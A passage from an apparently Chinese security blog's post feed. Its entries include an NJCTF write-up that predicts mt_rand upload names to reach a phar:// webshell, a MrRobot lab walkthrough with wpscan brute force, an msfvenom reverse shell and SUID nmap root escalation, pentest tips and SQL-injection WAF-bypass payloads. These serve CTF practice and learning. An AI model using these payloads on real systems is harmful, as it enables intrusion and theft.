1=1 and ord(substr(user(),1,1))-114[空白符] 控制字符替代法20 09 0A 0B 0C 0D A0 符号替代法 /**/、select.``.password、select+user() 括号组合法 union(select(1),2)、select&#123;x(password)&#125;from&#123;x(user)&#125; 不要害怕正则 未完待续！！！！！！！！ 参考链接CTF比赛总是输？你还差点Tricks!]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[string标准库源码学习]]></title>
      <url>%2F2017%2F03%2F29%2Fstring%E6%A0%87%E5%87%86%E5%BA%93%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%2F</url>
      <content type="text"><![CDATA[0x00 Contents1234567常量定义_TemplateMetaclassmaketrans_multimapTemplatestropFromatter 0x01 常量定义123456789whitespace = ' \t\n\r\v\f' 空白字符 \t制表符 \n换行ascii_lowercase = 'abcdefghijklmnopqrstuvwxyz'ascii_uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'ascii_letters = ascii_lowercase + ascii_uppercasedigits = '0123456789' 十进制hexdigits = digits + 'abcdef' + 'ABCDEF' 十六进制octdigits = '01234567' 八进制punctuation = r"""!"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~""" #标点符号printable = digits + ascii_letters + punctuation + whitespace 代码上来就是一系列常用的常量定义，知道就行，以后需要用到直接用（比如生成随机字符串，和random配合使用） 0x02 _TemplateMetaclass1234567891011121314151617181920class _TemplateMetaclass(type): pattern = r""" %(delim)s(?: (?P&lt;escaped&gt;%(delim)s) | # Escape sequence of two delimiters (?P&lt;named&gt;%(id)s) | # delimiter and a Python identifier &#123;(?P&lt;braced&gt;%(id)s)&#125; | # delimiter and a braced identifier (?P&lt;invalid&gt;) # Other ill-formed delimiter exprs ) """ def __init__(cls, name, bases, dct): super(_TemplateMetaclass, cls).__init__(name, bases, dct) if 'pattern' in dct: pattern = cls.pattern else: pattern = _TemplateMetaclass.pattern % &#123; 'delim' : _re.escape(cls.delimiter), 'id' : cls.idpattern, &#125; cls.pattern = _re.compile(pattern, cls.flags | _re.VERBOSE) _TemplateMetaclass是一个元类，它提供了一个核心功能： 通过创建出来的类，都有一个pattern属性 该属性能够解析类似于 delimiter{idpattern} 或者 delimiteridpattern的字符串。通过 它创建出来的类，只需要定制delimiter和idpatten的具体值就可拥有以上的功能 如果通过它创建出来的类，也可以自己提供pattern(但最终使用的时候，会被元类自动换成re对象) 0x03 Template 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283class Template(metaclass=_TemplateMetaclass): """A string class for supporting $-substitutions.""" """能够解析$表达式的字符串模板类""" delimiter = '$' idpattern = r'[_a-z][_a-z0-9]*' flags = _re.IGNORECASE def __init__(self, template): self.template = template # Search for $$, $identifier, $&#123;identifier&#125;, and any bare $'s def _invalid(self, mo): """如果解析到无效的占位符，就告诉调用者在及航机类出错""" i = mo.start('invalid') lines = self.template[:i].splitlines(keepends=True) if not lines: colno = 1 lineno = 1 else: colno = i - len(''.join(lines[:-1])) lineno = len(lines) raise ValueError('Invalid placeholder in string: line %d, col %d' % (lineno, colno)) def substitute(*args, **kws): if not args: raise TypeError("descriptor 'substitute' of 'Template' object " "needs an argument") self, *args = args # allow the "self" keyword be passed if len(args) &gt; 1: raise TypeError('Too many positional arguments') if not args: mapping = kws elif kws: mapping = _ChainMap(kws, args[0]) else: mapping = args[0] # Helper function for .sub() def convert(mo): # Check the most common path first. named = mo.group('named') or mo.group('braced') if named is not None: return str(mapping[named]) if mo.group('escaped') is not None: return self.delimiter if mo.group('invalid') is not None: self._invalid(mo) raise ValueError('Unrecognized named group in pattern', self.pattern) return self.pattern.sub(convert, self.template) def safe_substitute(*args, **kws): if not args: raise TypeError("descriptor 'safe_substitute' of 'Template' object " "needs an argument") self, *args = args # allow the "self" keyword be passed if len(args) &gt; 1: raise TypeError('Too many positional arguments') if not args: mapping = kws elif kws: mapping = _ChainMap(kws, args[0]) else: mapping = args[0] # Helper function for .sub() def convert(mo): named = mo.group('named') or mo.group('braced') if named is not None: try: return str(mapping[named]) except KeyError: return mo.group() if mo.group('escaped') is not None: return self.delimiter if mo.group('invalid') is not None: return mo.group() raise ValueError('Unrecognized named group in pattern', self.pattern) return self.pattern.sub(convert, self.template)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[python变量命名规则]]></title>
      <url>%2F2017%2F03%2F29%2Fpython%E5%8F%98%E9%87%8F%E5%91%BD%E5%90%8D%E8%A7%84%E5%88%99%2F</url>
      <content type="text"><![CDATA[0x00 前言1最近在读requests模块的源码，好的代码读起来让人心旷神怡。回想之前写的代码变量命名也是胡写一通。决定好好总结一番，并在以后的书写留意。虽然电脑并不会再议变量的名称，但值得在意的是，好的命名，能使你的程序更有可读性。 0x01 全局变量名（类变量，在java中相当于static变量）1234567大写字母，单词之间用_分割NUMBERCOLOR_WRITE对于from M import *导入语句，如果想阻止导入模块内的全局变量可以使用旧有的规范，在全局变量上加一个前导的下划线。&lt;!-- more --&gt;*注意*:应避免使用全局变量 0x02 普通变量12345678910小写字母，单词之间用_分割this_is_a_var*注意*：1.不论是类成员变量还是全局变量，均不使用 m 或 g 前缀。2.私有类成员使用单一下划线前缀标识，多定义公开成员，少定义私有成员。3.变量名不应带有类型信息，因为Python是动态类型语言。如 iValue、names_list、dict_obj 等都是不好的命名。 0x03 实例变量1234567以_开头，其他和普通变量一样_price_instance_var私有实例变量（外部访问会报错）：以__开头（2个下划线），其他和普通变量一样__private_var 0x04 专有变量123__开头，__结尾，一般为python的自有变量，不要以这种方式命名__doc____class__ 0x05 未完待续参考链接]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[NJCTF-Geuess]]></title>
      <url>%2F2017%2F03%2F16%2FNJCTF-Geuess%2F</url>
      <content type="text"><![CDATA[0x01 获取源码利用php的协议php://filter获取源码，具体方法：php://filter/convert.base64-encode/resource=upload，读到源码，然后base64解密 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?phperror_reporting(0);function show_error_message($message)&#123; die("&lt;div class=\"msg error\" id=\"message\"&gt; &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;");&#125;function show_message($message)&#123; echo("&lt;div class=\"msg success\" id=\"message\"&gt; &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;");&#125;function random_str($length = "32")&#123; $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F", "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L", "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R", "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X", "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9");//61 $str = ''; for ($i = 1; $i &lt;= $length; ++$i) &#123; $ch = mt_rand(0, count($set) - 1); $str .= $set[$ch]; &#125; echo "$ch"; return $str;&#125;session_start();$reg='/gif|jpg|jpeg|png/';if (isset($_POST['submit'])) &#123; $seed = rand(0,999999999); mt_srand($seed); $ss = mt_rand(); $hash = md5(session_id() . $ss); setcookie('SESSI0N', $hash, time() + 3600); if ($_FILES["file"]["error"] &gt; 0) &#123; show_error_message("Upload ERROR. Return Code: " . $_FILES["file-upload-field"]["error"]); &#125; $check1 = ((($_FILES["file-upload-field"]["type"] == "image/gif") || ($_FILES["file-upload-field"]["type"] == "image/jpeg") || ($_FILES["file-upload-field"]["type"] == "image/pjpeg") || ($_FILES["file-upload-field"]["type"] == "image/png")) &amp;&amp; ($_FILES["file-upload-field"]["size"] &lt; 204800)); $check2=!preg_match($reg,pathinfo($_FILES['file-upload-field']['name'], PATHINFO_EXTENSION)); if ($check2) show_error_message("Nope!"); if ($check1) &#123; $filename = './uP1O4Ds/' . random_str() . '_' . $_FILES['file-upload-field']['name']; if (move_uploaded_file($_FILES['file-upload-field']['tmp_name'], $filename)) &#123; show_message("Upload successfully. File type:" . $_FILES["file-upload-field"]["type"]); &#125; else show_error_message("Something wrong with the upload..."); &#125; else &#123; show_error_message("only allow gif/jpeg/png files smaller than 200kb!"); &#125;&#125;?&gt; 0x02 php随机数安全性分析从源码中，可以发现两个关键函数rand()函数和mt_rand()函数，在php中，说道rand()函数和mt_rand()函数，就不得不说与他们相对应的两个播种随机数种子的函数，srand（）和mt_srand()， 看如下测试代码： 123456789101112&lt;?phpmt_srand(123456);srand(123);echo "rand函数在种子是123456时产生的随机数序列:\n";for($i=1;$i&lt;5;$i++)&#123; echo rand()."\n";&#125;echo "mt_rand函数在种子是123456时产生的随机数序列:\n";for($i=1;$i&lt;5;$i++)&#123; echo mt_rand()."\n";&#125;?&gt; 运行结果： 测试发现无论是rand()函数还是mt_rand()函数，当随机数种子相同时，无论运行多少次，产生的随机数序列都是一样的，故如我们在代码中自己播种了随机的种子，但是泄露了这个种子，就会导致产生的随机数序列被别人猜到，进而造成安全问题。 在php&gt;4.2.0版本中，不再需要手动用stand()或mt_srand()函数给随机数发生器播种了，已自动完成，也就是随机数的种子不用我们给了，php会自动播种一个种子，这样子就不存在种子泄露问题了，这样就完全了吗？其实并不然 PHP7.1 mt_rand已经变好了，本来php的随机数就不应该用在加密解密上，甚至都不应该自己写加密解密的方法。php5里最优的方法应该是用openssl，php7以后php会加自己的加密解密库。 看下面： 在kali系统中，rand() 和 mt_rand() 产生的最大随机数都是2147483647,正好是 2^31-1 , 也就是说随机播种的种子也是在这个范围中,0 – 2147483647 的这个范围是允许我们进行爆破的. 但是用 php爆破比较慢,有大牛已经用c写了一个爆破种子程序php_mt_seed，预测种子的工具 演示一下它的基本用法在演示例子中，让php自动播种一个种子并产生一个随机数，然后用php_mt_seed这个工具把产生的随机数作为参数，去爆破种子，最后得到三个结果，经验证，三个结果只有前两个是正确的，但是都会产生这样一个随机数 php manual 中说,自动播种种子是指:在每次调用 mt_rand()函数之前都播种一次种子呢,还是多次调用 mt_rand()函数之前,只播种一次种子呢,这对于我们能否猜到产生的随机数序列至关重要. 做一下测试：在测试中，在没有进行手工播种的情况下产生两个连续的随机数，然后去爆破种子，得到了四个可能的种子，经过测试发现其中一个种子产生的随机数序列和预期的相同，故可以猜想在php中产生一些列的随机数时，只进行了一次播种 考虑下面代码安全性我们能否根据公开的key，猜到$private？下面演示破解国称，首先获得public key在每一位字符串中的位置：然后用php_mt_seed进行破解成功破解了一个seed，测试：这样就说明了,我们只需要拿到public key,就可以预测到private key 的值了. 言归正传12345678910111213141516171819202122232425&lt;?phpfunction random_str($length = "32")&#123; $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F", "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L", "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R", "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X", "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9"); $str = ''; for ($i = 1; $i &lt;= $length; ++$i) &#123; $ch = mt_rand(0, count($set) - 1); $str .= $set[$ch]; &#125; return $str;&#125;session_start(); $seed = rand(0,999999999);mt_srand($seed);$ss = mt_rand();$hash = md5(session_id() . $ss);setcookie('SESSI0N', $hash, time() + 3600); $filename = './uP1O4Ds/' . random_str() . '_' . $_FILES['file-upload-field']['name'];?&gt; 我们的目标是猜测出filename.这里 $seed 是 rand(0,999999999)生成的,我们不知道,但是$hash = md5(session_id() . $ss);我们却是知道的,在 cookie的SESSION中,当把cookie中的 PHPSESSID 设为空的时候,session_id()就也是空了,通过结hash,就可以获得 mt_rand() 产生的第一个随机数,然后用 php_mt_seed这工工具爆破种子,就可以直接算出文件名了. exp1234567891011121314151617181920&lt;?phpmt_srand(831237446);echo mt_rand()."\n\r";function random_str($length = "32") &#123; $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F", "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L", "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R", "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X", "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9"); $str = ''; for ($i = 1; $i &lt;= $length; ++$i) &#123; $ch = mt_rand(0, count($set) - 1); $str .= $set[$ch]; &#125; return $str;&#125;echo random_str()."\n\r"; 具体实现步骤观察之后发现我们如果有文件名，我们可以通过将木马压缩进zip包，然后上传该zip文件(改成Png后缀上传)，利用phar伪协议包含执行命令。 所以我们的核心就是搞到文件名，即想办法搞到$seed。 这里我将一句话写进0.php，压缩之后改名为0.png上传 然后至于这里的session_id()，我们通过设置Cookie: PHPSESSID=;就能让它为空，所以得到随机数的md5，解开后的值为78503716生成文件名的前一部分为YQO4DMVYN25oxMabf9t5UBKnngcPQf2y，加上我们上传的0.png,所以完整的文件路径利用exp为/uP1O4Ds/YQO4DMVYN25oxMabf9t5UBKnngcPQf2y_0.png，然后访问 http://218.2.197.235:23735/?page=phar://uP1O4Ds/YQO4DMVYN25oxMabf9t5UBKnngcPQf2y_0.png/0，最后执行命令即可拿到flag。 如下： ###参考链接http://bendawang.site/article/NJCTF-2017-web-Writeup http://www.cnblogs.com/iamstudy/articles/2017_NJCTF_Some_Web_Writeup.html http://wonderkun.cc/index.html/?p=585]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[文件包含-phar LFI]]></title>
      <url>%2F2017%2F03%2F14%2F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-phar-LFI%2F</url>
      <content type="text"><![CDATA[###0x01 什么是phar文件phar文件是一个文件归档包，类似于Java中的Jar文件，方便PHP模块的迁移。php中默认安装了这个模块； 简言之，Phar就是把java界的jar概念迁移到了PHP界，Phar可以将一组PHP文件进行打包，还可以创建默认执行stub，同时Phar可以选择是否进行压缩； ###0x02 创建一个phar文件12]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[攻破MrRobot-黑客技能训练]]></title>
      <url>%2F2016%2F12%2F02%2F%E6%94%BB%E7%A0%B4MrRobot-%E9%BB%91%E5%AE%A2%E6%8A%80%E8%83%BD%E8%AE%AD%E7%BB%83%2F</url>
      <content type="text"><![CDATA[MrRobot下载链接 准备阶段第一步：找到靶机的ip地址，寄出神器nmap开始一直找不到靶机的地址，解决方法，桥接模式且复制物理网络连接状态，重启之后就扫到了 第二步：打开靶机 第三步：扫描开放的端口 第四步：利用nikto扫描一下网站Nikto是一款开放源代码，功能强大的WEB扫描评估软件，能对服务器多种安全项目进行测试的扫描工具，去寻找已知有名的漏洞； 利用nitko命令可以帮助我们收集像文件信息和其他的主要的信息，渗透之前我们不需了解我们的目标 nitko -h 192.168.0.163我们很快的得到这是一个wordpress的站注射过程 前戏Ctrl+u查看网站源代码，不过貌似并没有什么卵用，var USER_IP=&#39;208.185.115.6查看另一个ip地址，大概是调用了这个ip地址的js或其它的文件根据前面收集到的信息，有robots.txt文件，进行拿站的常规思路，收获了一点点信息根据robots.txt收集到的信息，得到第一个flag访问http://192.168.0.163/fsocity.dic，得到了一个字典文件，给我的第一直觉就是网站后台的爆破 渗透之旅根据之前利用nitko扫描到的信息，可以知道网站的后台是/wp-login.php这也是wordpress默认后台的地址 得到了密码字典，紧接着一个问题又跟来了，用户名是什么，继续搞，没有思路了，蓝瘦香菇，突然翻到前面的时候，灵光一闪接着搞起来，然而/fuction,/join等都是找不到页面不应该呀，先把字典下载还是没有思路，明明给了提示咋还是搞不定，原来是自己傻了，明明页面就给了命令端，而自己傻了吧唧的往url上面输，自己笨怪谁呀 接下来我尝试命令inform,展现在眼前的是一个hactivism类型的宣传大约读了读也没有找到可以说没有找到什么有用的信息，当我输入命令question,又是令我费解的产生了几张图片，直觉给我，这里面是充满故事的当我试图去搜索executive everyone steals that&#39;s how it works，从google中得到了一个有用的信息，似乎和这道题有关系https://www.tvfanatic.com/quotes/shows/mr-robot/episodes/hellofriendmov/,其中有一个人名Elliot，抱着尝试的态度看到这个错误提醒我知道，用户名正确了，因为之前尝试admin等直接给出的是用户名错误，用户名有了，剩下的就只有利用wpscan来爆破用户名登陆了；wpscan --url 192.168.0.163 --threads 20--wordlist /root/Desktop/fsocity.dic --username Elliot --threads参数：设置线程 --wordlist参数：设置字典文件的路径 --username参数：设置wordpress的用户名 然后就可以顺利登陆进来了剩下的就是利用wordpress的版本找漏洞了，这里有两个思路，一个就是利用msfvenom生成木马提权，第二个就是利用wordpress版本曝出的漏洞来进行提权渗透 方法一：利用kali中的msfvenmmsfvenom是一个独立于Metasploit框架之上的后门生成工具，它是原有旧版的msfpayload和msfencode的集合。新版的Metasploit Framework已经没有这两个工具。 常用的参数： -p：需要使用的攻击载荷 -f：输出载荷的格式，可以使用–help-formates列出所有可用格式 -o:指定输出位置 lhost：payload参数，指定反向连接服务端地址 lport：payload参数，指定反向链接服务端端口 -k：配置攻击载荷在独立的线程中启动，不影响宿主程序的运行 查看所有linux可用的payload：msfvenom -l payloads| grep linu 生成payload:msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.107 lport=1234 -f raw复制代码从&lt;php die();到wordpress后台模板并保存接下来就是注射阶段了 Use exploit/multi/handler set payload php/meterpreter/reverse_tcp set lhost 192.168.0.107 set lport 4444 exploit 一旦执行了漏洞，现在需要的就是在浏览器中访问后门文件http://192.168.0.163/wp-content/themes/twentyfifteen/404.php成功了，结果还是可喜的这样就可以轻松获取一个webshell了，接下来就是进入目标用户，并可以知道所有的用户类型信息 ls -lsa (获取用户详细的信息) cd home ls -lsa cd robot 成功了三分之二了，剩下的一关又找不到头绪，但是之前做程序员游戏那个每个信息都是有用的，眼前这个password.raw-md5觉得可以动动脑筋，思路是不会错的,做到后面我才知道，其实我并没有到第二关，看过程其中前面的MD5解密后的结果就是下面的密码，我服 下面这个就是技巧，干货，利用nmap形成一个interactive shell nmap nmap –interactive（用户能够通过该选项执行shell命令，通常，安全人员会使用该命令来避免他们使用nmap命令被记录在history文件中） !sh（nmap有SUID位，故可以通过“!sh”我们会获取到一个root权限的shell，其含义就是代码由bash shell解释） id cd /root 补充之后又get到的用户名密码利用sort命令，它可以帮我们依据不同的数据类型进行排序，-n参数是依照熟知的大小排序 方法二：利用wordpress版本漏洞getshell经过goole在github找到一个wordpress-shell，链接wordpress-shell 过程：接着访问http://192.168.0.163/wp-content/plugins/shell/shell.php根据readme，访问http://192.168.0.163/wp-content/plugins/shell/shell.php?cmd=id这个思路没有搞定，现在直接尝试一句话 利用思路二，从插件，已安装的插件，编辑，插入一句话木马，相对地址/wp-content/plugins/shell相对地址/wp-content/plugins/all-in-one-seo-pack/all_in_one_seo_pack.php 菜刀连接:翻目录看到说明我们这个只是apache用户的权限，robot用户的部分权限。其实方法一我们就可以在知道，下载下来里面的内容是ERROR:// Can Not Read,但是password.raw-md5可以下载，Notepad++打开，可以看到那段密码，这个过程省略 最后就是在webshell执行以下脚本百度云-密码7k6j将数据转发至本机，先反弹回来一个半交互的shell由于权限低，利用代码python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;获取一个完整的交互式shell 接下来的提权过程和上面就大同小异啦 总结难点就在第三关的提权环节，这一点要回归到Linux文件权限的问题。在Linux中除了文件的基本权限-rwxrwxrwx，还有就是文件的特殊权限，就是SUID和SGID以及SBIT，大致说一下他们的含义 SUID含义：SUID shell是一种可用于以拥有者权限运行的shell。也就是说，如果拥有者是root，那你就可能以root的 SGID含义：对文件而言是以文件所属身份执行，而更重要的是对目录的权限 SBIT含义：要求操作系统既是在可执行程序退出后，仍要在内存中保留该程序的映像，这样做是为了节省大型程序的启动时间，但是会占用系统资源 所以我们利用SUID的权限漏洞，利用命令find / -perm -u=s -type f 2&gt;/dev/null查找所有用户有SUID权限的文件。通过列出的目录发现了nmap，低版本的nmap支持“interactive.”选项，用户能够通过该选项执行shell命令，通常，安全人员会使用该命令来避免他们使用nmap命令被记录在history文件中，通过nmap就可以拿到交互的shell，因为nmap有SUID位，所以通过!sh就会获取到一个root权限的shell。 最后强调一点，学习nc等，首先要懂socket通信，归根就是网络]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[模拟渗透测试get到的技巧]]></title>
      <url>%2F2016%2F11%2F30%2F%E6%A8%A1%E6%8B%9F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95get%E5%88%B0%E7%9A%84%E6%8A%80%E5%B7%A7%2F</url>
      <content type="text"><![CDATA[一 nmap使用技巧当针对入口点IP地址进行端口扫描，将其所开放的端口号（仅扫描小于1000的端口），由于在CMD测试，禁止ping，则需要使用到-Pn参数 -vv参数表示输出详细报告结果，-p指定端口扫描，-Pn为扫描前不进行ping操作，如果网站禁止了ping，扫描时不加Pn扫不出开放端口 二 Rsync漏洞Rsync,remote synchroniz顾名思义就知道它是一款实现远程同步功能的软件，它在同步文件的同时可以保持原来文件的权限，时间，软硬链接等附加信息。它是用 “rsync 算法”提供了一个客户机和远程文件服务器的文件同步的快速方法，并可以通过ssh方式来传输文件，这样其保密性也非常好，另外还是免费软件。 Rsync默认的端口是873，可以使用nmap扫描哪些ip开放了873端口 nmap -n --open -p 873 x.x.x.x/24 找到开放的873端口后，连接能否查看模块名 rsync x.x.x.x:: 若可以，就尝试上传，下载文件试一下 rsync中有时候存在未授权访问rsync 172.16.1.110:: rsync链接 rsync 172.16.1.110::www/ 列出这个目录下的文件 rsync 172.16.1.110::www/flag02 把flag02下载保存到本地root目录 三 利用kali fcrackzip对zip密码压缩文件暴力破解若在ctf比赛中没有现成的zip爆破工具，则可以利用kali中的fcrackzip工具 fcrackzip -b -v -u -c a -l 1-6 1.zip -b参数：指定暴力枚举 -v参数:显示破解信息 -u参数：进行解压测试以排除错误密码 -c参数：指定字符集 -c a指定的字符集为纯小写字母 -l参数：指定密码长度]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Linux常用命令使用总结]]></title>
      <url>%2F2016%2F11%2F17%2FLinux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93%2F</url>
      <content type="text"><![CDATA[1 strings命令strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印的任意序列，以换行符或空字符结束。strings命令对识别随机对象文件很有用。 语法： strings [-a] [-] [-o] [-t Format] [-n Number] [file…] -a –all:扫描整个文件而不是只扫描目标文件初始化和装载段 -：设置显示的最少的字符数，默认是4个字符 -t –radix={o,d,x}:输出字符的位置，基于八进制，十进制还是十六进制 -o:类似–radix=0 列出ls中所有的ASCII文本： strings /bin/ls 列出ls中所有的ASCII文本： cat /bin/ls strings 查找ls中包含libc的字符串，不区分大小写： strings /bin/ls | grep -i libc 2 grep命令grep命令是一个强大的文本搜索工具，它能使用正则表达式搜索文本，并把匹配的行打印出来 常用的参数： -i：忽略大小写的差别 -c：计算符合样式的列数 -n：在显示符合样式的那一行之前，标识出该行的列数编号 -f：指定规则的文本 3 mv命令mv命令用来对文件或目录重新命名，或者将文件从一个文件移到另一个目录。source表示源文件或目录，target表示目标文件或目录。如果将一个文件移动到另一个已经存在的文件中，则目标文件的内容将会被覆盖。 注意： mv与cp的结果不同，mv好像文件的”搬家”，文件个数并未增加。而cp对文件进行复制，文件个数增加了。 4 foremost命令foremost是一个根据文件头和内部数据恢复文件的一个工具，在ctf比赛中也比较有用 foremost是一个基于文件头和尾部信息以及文件的内建数据恢复文件的命令行工具 安装foremost后你可以使用foremost -help查看使用帮助，这里最简单分离文件的命令为： foremost carter.jpg 5 convert命令convert是linux下的图片处理工具，在一些ctf比赛的隐写中较常用 convert +append a.gif b.png b.png是拼接好的图片，意思是将gif图片转换为png +append代表是横向拼接 -append代表是纵向拼接 6 unzip命令unzip命令用于解压缩由zip命令压缩的.zip压缩包常用的参数： -d&lt;目录&gt;：指定文件解压缩后所要存储的目录 7 tcpdump命令tcpdump是一个用于解读网络分组，并输出分组内容的工具。tcpdump凭强大的功能和灵活的截取策略，使其成为类UNXI系统下用于网络分析和问题排查的首选工具 -w，如果你要将监听所得的数据包数据储存下来，用这个参数就对了。后面接文件名 -O 不运行分组分组匹配（packet-matching）代码优化程序 -s 从每个分组中读取最开始的snaplen个字节，而不是默认的68个字节。 8 tcpicktcpick是一款基于文本的嗅探器，能追踪，重组和重排tcp流 9 WPSCANwpscan是一款针对wordpress的安全扫描软件，可以扫描出wordpress的版本，主题，插件，后台用户以及爆破后台密码等。 10 wc命令wc命令的功能为统计指定文件中的字节数，字数，行数，并将统计结果显示输出 常用到的参数： -c参数：统计字节数 -l参数：统计行数 -w参数：统计字数 wc -w flag.dic 11 arp-scan命令扫描局域网IP地址 arp-scan -l：查看网段所有的主机 12 sort命令sort是一个很有用的命令，它可以帮助我们排序，而且可以根据不同的数据类型进行排序 -f ：忽略大小写的差异，例如 A 与 a 视为编码相同； -b ：忽略最前面的空格符部分； -n ：使用『纯数字』进行排序(默认是以文字型态来排序的)； -r ：反向排序； -u ：就是 uniq ，相同的数据中，仅出现一行代表； -t ：分隔符，默认是用 [tab] 键来分隔； -k ：以那个区间 (field) 来进行排序的意思 使用：sort -u fsocity.dic &gt; sorted.txt 13 id命令id命令可以显示真实有效的用户ID（UID）和用户ID（GID）。UID是对一个用户的单一身份表示。组ID则对应多个UID。id命令已经默认预装在大多数的Linux系统中。要使用它，只需要你在控制台输入id。 当我们想知道某个用户的UID和GID时，id命令是非常有用的。一些程序可能需要UID/GID来运行。id使我们更容易地找出用户UID以及GID而不必再/etc/group文件中查找 解释：``用户ubuntu的UID号码=1000，GID号码=1000语法： id [-gGnru][--help][--version][用户名称]选项： -g或--group 显示用户所属群组的ID。 -G或--groups 显示用户所属附加群组的ID。 -n或--name 显示用户，所属群组或附加群组的名称。 -r或--real 显示实际ID。 -u或--user 显示用户ID。 13 find命令find命令用来在指定目录下查找文件。任何位于参数之前的字符串都将视为欲查找的的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件。 以下列举平时常用到的： find / -type 类型参数 f：普通文件 l：符号连接 d：目录 根据文件权限/所有权进行匹配当前目录下搜索出权限为777的文件find . -type f -perm 777 找出当前目录用户tom拥有的所有文件find . -type f -user tome 14 在Linux文件中权限的问题r(Read，读取)：对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目 录的权限。w(Write,写入)：对文件而言，具有新增、修改文件内容的权限；对目录来说，具有删除、移动目录内文件的权限。x(eXecute，执行)：对文件而言，具有执行文件的权限；对目录了来说该用户具有进入目录的权限。s或S（SUID）：可执行的稳健搭配这个权限，便能得到特权，任意存取改文件的所有者能使用全部系统资源 15 wget命令wget -r -p -np -k http://xxx.com/xxx r, –recursive（递归）specify recursive download.（指定递归下载） p, –page-requisites（页面必需元素） get all images, etc. needed to display HTML page.（下载所有的图片等页面显示所需的内容） np, –no-parent（不追溯至父级） don’t ascend to the parent directory. k, –convert-links（转换链接） make links in downloaded HTML point to local files.（将下载的HTML页面中的链接转换为相对链接即本地链接） 例：wget -r -p -np -k http://jdrops.dropsec.xyz/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[渗透绕WAF的方法]]></title>
      <url>%2F2016%2F11%2F15%2F%E6%B8%97%E9%80%8F%E7%BB%95WAF%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
      <content type="text"><![CDATA[基本/简单绕过方法1.注释符http://www.xxx.com/index.php?page_id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3,4… 2.使用大小写http://www.xxx.com/index.php?page_id=-1 uNIoN SeLEct 1,2,3,4… 3.结合前面两种方法http://www.xxx.com/index.php?page_id=-1 /*!unIOn*//*!SelECT*/ 1,2,3.. 4.关键字替换http://www.xxx.com/index.php?page_id=-1 UNIunionON SELselectECT 1,2,3,4… 适用于一些会把union select替换掉的WAF 5.内部注释http://www.xxx.com/index.php?page_id=-1 %55nION/**/%53ElecT 1,2,3,4… U替换为%55，S替换为%53 在 union 和 select 之间添加注释/**/ 高级绕过方法1.使用其他变量或者命令对注入语句进行替换group_concat() | concat_ws() @@version | version() concat() | concat_ws() COMMAND | WHAT TO USE INSTEAD 2.对字母进行编码http://www.xxx.com/index.php?page_id=-1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4…. 3.利用WAF本身的功能绕过若发现WAF会把”*”替换为空，则可以利用这一特性来绕过 http://www.xxx.com/index.php?page_id=-1+un*ion+se*lect+1,2,3.. 其它方法：-15+(uNioN)+(sElECt)….-15+(uNioN+SeleCT)+…-15+(UnI)(oN)+(SeL)(ecT)+….-15+union (select 1,2,3,4…)‍ 4.缓冲区溢出使防火墙崩溃大部分防火墙都是基于c/c++开发，故可以使用缓冲区溢出使WAF崩溃 http://www.xxx.com/index.php?page_id=-1+and+(select1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4 使用如下方法测试WAF ?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[docker学习]]></title>
      <url>%2F2016%2F11%2F10%2Fdocker%E5%AD%A6%E4%B9%A0%2F</url>
